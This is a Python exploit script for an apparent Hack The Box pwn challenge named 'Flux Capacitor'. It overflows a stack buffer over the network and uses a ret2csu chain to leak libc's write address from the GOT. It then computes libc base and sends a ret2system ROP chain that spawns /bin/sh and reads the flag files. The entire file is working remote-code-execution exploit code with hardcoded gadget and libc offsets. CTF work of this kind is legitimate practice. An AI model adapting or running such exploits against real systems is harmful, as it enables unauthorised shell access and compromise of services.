#!/usr/bin/env python3
"""Flux Capacitor — BOF in main's read(0, buf, 0x100) -> stack overflow.
Stage 1: csu_init gadget pair -> write(1, write@got, 8) -> back to main.
Stage 2: ret2system("/bin/sh").
"""
import socket, struct, sys, time, re

HOST, PORT = sys.argv[1], int(sys.argv[2])

POP_RDI    = 0x400953
RET        = 0x400954
CSU_POP    = 0x40094a        # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_MID    = 0x400930        # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]; loop; tail
WRITE_PLT  = 0x400510
WRITE_GOT  = 0x600fd0
MAIN       = 0x400684

LIBC_WRITE_OFF   = 0x110210
LIBC_SYSTEM_OFF  = 0x4f550
LIBC_BINSH_OFF   = 0x1b3e1a

p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)

def recv_some(s, secs=1.5):
    s.settimeout(secs)
    out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            out += c
    except socket.timeout:
        pass
    return out

s = socket.create_connection((HOST, PORT))

# Drain the ASCII art + prompt
intro = recv_some(s, 2.0)
print(f"[+] got intro ({len(intro)} bytes)")

# Buffer at rbp-0x20 (32 bytes) -> need 32+8=40 bytes padding
PAD = b"A" * 40

# Stage 1: csu chain calling write(1, write@got, 8) then returning to main
stage1 = b"".join([
    PAD,
    p64(CSU_POP),
    p64(0),               # rbx
    p64(1),               # rbp (loop terminator)
    p64(WRITE_GOT),       # r12 -> call [r12+rbx*8] = *write_got = libc write
    p64(1),               # r13 -> edi = 1
    p64(WRITE_GOT),       # r14 -> rsi = &write_got (buf)
    p64(8),               # r15 -> rdx = 8 (count)
    p64(CSU_MID),
    p64(0)*7,             # tail: add rsp,8 + 6 pops (7 slots)
    p64(MAIN),            # final ret target
])
s.sendall(stage1)

# After read returns, main runs the trailing two writes (16 + 18 bytes ~ 34),
# then leave/ret triggers our csu chain. csu writes the 8-byte leak then
# returns to main, which restarts and prints all the ASCII art again.

# Wait for stage1 echo to complete + leak to land
post1 = recv_some(s, 3.0)
print(f"[+] post-stage1 captured {len(post1)} bytes")

# Find a valid libc-shaped 8-byte sequence after the trailing message.
# A libc address has bytes [5]=0x7f and bytes [6]=[7]=0x00.
leak_bytes = None
for off in range(len(post1) - 8):
    candidate = post1[off:off+8]
    if candidate[5] == 0x7f and candidate[6] == 0x00 and candidate[7] == 0x00:
        leak_bytes = candidate
        print(f"[DEBUG] found libc-shaped leak at offset {off}")
        break
if leak_bytes is None:
    print(f"[!] no libc address pattern found. raw: {post1[-100:]!r}")
    sys.exit(1)
libc_write = struct.unpack("<Q", leak_bytes)[0]
print(f"[+] libc write = {hex(libc_write)}")
libc_base = libc_write - LIBC_WRITE_OFF
print(f"[+] libc base  = {hex(libc_base)}")
system_addr = libc_base + LIBC_SYSTEM_OFF
binsh_addr  = libc_base + LIBC_BINSH_OFF
print(f"[+] system     = {hex(system_addr)}")
print(f"[+] /bin/sh    = {hex(binsh_addr)}")

# Stage 2: drain to next read prompt, then ret2system
# The next read prompt is the same as the first — wait for it.
# Easier: just drain a bit then send stage 2 (read accepts our data anytime).
recv_some(s, 1.0)

stage2 = b"".join([
    PAD,
    p64(RET),
    p64(POP_RDI),
    p64(binsh_addr),
    p64(system_addr),
])
s.sendall(stage2)

time.sleep(0.5)
s.sendall(b"cat flag.txt; cat /flag.txt; ls\n")
time.sleep(0.5)
out = recv_some(s, 3.0)
print("\n[+] shell output:")
print(out.decode(errors='replace'))

m = re.search(rb"HTB\{[^}]+\}", out)
if m:
    print(f"\n[+] FLAG: {m.group(0).decode()}")
s.close()
